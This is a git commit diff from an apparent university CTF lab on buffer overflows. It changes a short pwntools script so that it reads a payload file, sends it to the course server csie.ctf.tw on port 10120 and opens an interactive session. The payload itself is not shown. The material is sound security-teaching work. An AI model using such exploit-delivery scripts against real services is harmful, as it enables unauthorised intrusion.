979e919e9ba8730ee5739a436588961461dbd218
Yasheed1995 <qwerty8608301@gmail.com>
2018-09-28 09:52:45 +0800

    lab2-1

--- buffer_overflow/pwn_payload.py
+++ buffer_overflow/pwn_payload.py
@@ -2,5 +2,7 @@ from pwn import *
 context(arch = 'i386', os = 'linux')
 
 r = remote('csie.ctf.tw', 10120)
-r.send('./payload')
+payload = open('./payload')
+payload = (payload.read())
+r.sendline(payload)
 r.interactive()
